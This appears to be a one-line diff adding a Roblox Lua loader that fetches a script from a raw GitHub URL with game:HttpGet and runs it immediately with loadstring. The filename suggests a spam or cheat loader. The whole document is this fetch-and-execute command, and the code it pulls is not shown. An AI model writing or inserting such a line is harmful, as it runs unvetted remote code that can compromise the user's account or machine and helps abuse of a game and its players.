@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/anniversary-daybreak-spam3-7z4e2wxzmb4f0w.lua"))()
